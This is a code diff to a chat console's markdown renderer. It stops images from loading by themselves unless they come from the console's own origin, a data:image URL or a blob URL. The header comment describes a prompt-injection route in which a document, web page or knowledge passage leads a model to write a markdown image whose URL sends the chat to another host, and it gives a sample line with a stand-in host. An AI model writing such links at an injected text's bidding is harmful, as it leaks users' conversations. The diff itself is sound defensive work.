@@ -13,19 +13,101 @@
  *
  * These are the two pieces Streamdown is built from; the rendering and its
  * look stay react-markdown's and the theme's (`markdownSx`).
+ *
+ * A picture loads only from the console's own origin, a `data:image/` URL or
+ * a `blob:` URL. Any other is shown as a link that loads nothing until it is
+ * clicked: the text is often a model's, and a model can be talked into
+ * writing `![](https://elsewhere/?q=<the chat>)` by a document, a web page or
+ * a knowledge passage -- an image the browser fetches by itself would send
+ * the chat there without a click.
  */
-import { memo, useMemo } from "react";
+import { memo, useMemo, type ComponentPropsWithoutRef } from "react";
 import type { Theme } from "@mui/material/styles";
 import type { SystemStyleObject } from "@mui/system";
-import ReactMarkdown from "react-markdown";
+import ReactMarkdown, { defaultUrlTransform, type Components, type UrlTransform } from "react-markdown";
 import rehypeHighlight from "rehype-highlight";
 import remarkGfm from "remark-gfm";
 import { Lexer } from "marked";
 import remend from "remend";
+import { useTranslation } from "react-i18next";
 
 const REMARK_PLUGINS = [remarkGfm];
 const REHYPE_PLUGINS = [rehypeHighlight];
 const NO_REHYPE: [] = [];
+
+/** Resolves relative URLs when there is no page (server rendering): they count as the page's own. */
+const NO_PAGE_ORIGIN = "http://page.invalid";
+
+function pageOrigin(): string {
+  return typeof window !== "undefined" && window.location?.origin && window.location.origin !== "null"
+    ? window.location.origin
+    : NO_PAGE_ORIGIN;
+}
+
+/**
+ * Whether a picture may load by itself: from the page's own origin (a relative
+ * URL included), a `data:image/` URL or a `blob:` URL. Nothing else, so the
+ * browser never fetches a picture from a host the text names.
+ */
+export function isLocalImageSrc(src: string | null | undefined, origin: string = pageOrigin()): boolean {
+  if (!src) return false;
+  const value = src.trim();
+  if (/^data:/i.test(value)) return /^data:image\//i.test(value);
+  if (/^blob:/i.test(value)) return true;
+  try {
+    const url = new URL(value, `${origin}/`);
+    return (url.protocol === "http:" || url.protocol === "https:") && url.origin === new URL(origin).origin;
+  } catch {
+    return false;
+  }
+}
+
+/** The host a picture would come from, for its link; the URL itself when it has none. */
+function imageHost(src: string): string {
+  try {
+    return new URL(src, `${pageOrigin()}/`).host || src;
+  } catch {
+    return src;
+  }
+}
+
+/**
+ * react-markdown's URL filter, which also lets a picture's own `data:image/`
+ * and `blob:` sources through (the default drops both). Links keep the default.
+ */
+const urlTransform: UrlTransform = (value, key, node) => {
+  if (key === "src" && node.tagName === "img" && /^(data:image\/|blob:)/i.test(value.trim())) return value;
+  return defaultUrlTransform(value);
+};
+
+type ImageProps = ComponentPropsWithoutRef<"img"> & { node?: unknown };
+
+/** A picture from the page's own origin; any other as a link to it that loads nothing by itself. */
+function MarkdownImage({ node: _node, src, alt, ...rest }: ImageProps) {
+  const { t } = useTranslation();
+  const url = typeof src === "string" ? src : "";
+  if (isLocalImageSrc(url)) return <img src={url} alt={alt ?? ""} {...rest} />;
+  const label = alt?.trim() || t("common.image", { defaultValue: "image" });
+  if (!url) return <span>{label}</span>;
+  const host = imageHost(url);
+  return (
+    <a
+      href={url}
+      target="_blank"
+      rel="noopener noreferrer nofollow"
+      referrerPolicy="no-referrer"
+      title={t("common.remote_image", {
+        host,
+        defaultValue: "A picture from {{host}}, not loaded. Click to open it.",
+      })}
+      data-remote-image=""
+    >
+      {label} ({host})
+    </a>
+  );
+}
+
+const COMPONENTS: Components = { img: MarkdownImage };
 
 /** A reference definition (`[id]: url`) or footnote (`[^1]: ...`) links blocks to each other. */
 const CROSS_BLOCK = /^ {0,3}\[\^?[^\]\n]+\]:/m;
@@ -45,7 +127,12 @@ export function splitBlocks(text: string): string[] {
 
 const Block = memo(function Block({ text, highlight }: { text: string; highlight: boolean }) {
   return (
-    <ReactMarkdown remarkPlugins={REMARK_PLUGINS} rehypePlugins={highlight ? REHYPE_PLUGINS : NO_REHYPE}>
+    <ReactMarkdown
+      remarkPlugins={REMARK_PLUGINS}
+      rehypePlugins={highlight ? REHYPE_PLUGINS : NO_REHYPE}
+      components={COMPONENTS}
+      urlTransform={urlTransform}
+    >
       {text}
     </ReactMarkdown>
   );
